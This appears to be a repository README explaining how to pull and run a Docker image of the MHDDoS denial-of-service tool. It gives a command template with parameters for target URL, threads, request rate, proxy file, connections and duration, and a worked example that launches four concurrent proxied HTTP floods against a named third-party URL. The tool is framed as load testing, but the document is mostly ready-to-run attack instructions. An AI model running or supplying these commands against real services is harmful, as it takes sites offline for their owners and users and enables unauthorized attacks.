# MHDDoS Docker

This repository provides instructions to use the MHDDoS tool in a Docker container. MHDDoS is a tool that performs distributed denial-of-service (DDoS) attacks for load testing or stress testing purposes. The image is hosted on Docker Hub and can be used to perform attacks with customizable proxies.

## Prerequisites

- Docker installed on your machine.
- A proxy list file (e.g., `https.txt`) containing the proxies to be used in the attacks (optional if you intend to provide proxies manually or dynamically).

## Usage

### Pull the Docker Image

To get the latest version of the Docker image, run:

```bash
docker pull seanr95/mhddos:latest
```

## Running with a Prepopulated Proxy File

If you already have a proxy file, you can map it into the container and run the MHDDoS tool with the following steps:

1. Ensure your proxy file (e.g., `https.txt`) is located on your server. For this example, the file is located at `/home/MHDDoS/files/proxies/https.txt`.
   
2. Use the `-v` flag to map the local proxy file to the container, then run the attack with the following command:

### Command Template

```bash
docker run -d \
    -v /path/to/proxies.txt:/app/files/proxies/https.txt \
    seanr95/mhddos bash -c 'python3 start.py [METHOD] [URL] [THREADS] [REQUESTS] [PROXY FILE] [CONNECTIONS] [TIME]'
```

Where:
- `[METHOD]`: HTTP method (`GET`, `POST`, etc.).
- `[URL]`: The target URL.
- `[THREADS]`: Number of threads.
- `[REQUESTS]`: Number of requests per second.
- `[PROXY FILE]`: The proxy list file (e.g., `https.txt`).
- `[CONNECTIONS]`: Number of connections.
- `[TIME]`: Time duration for the attack in seconds.

## Example Use Case

```bash
docker run -d \
    -v /home/MHDDoS/files/proxies/https.txt:/app/files/proxies/https.txt \
    seanr95/mhddos bash -c 'parallel ::: \
    "python3 start.py GET https://autodemo.radware.net 1 100 https.txt 100 300" \
    "python3 start.py GET https://autodemo.radware.net/ 1 100 https.txt 100 300" \
    "python3 start.py GET https://autodemo.radware.net/ 1 100 https.txt 100 300" \
    "python3 start.py GET https://autodemo.radware.net/ 1 100 https.txt 100 300"'
```

This command will initiate four concurrent MHDDoS attacks using proxies from the prepopulated `https.txt` file.

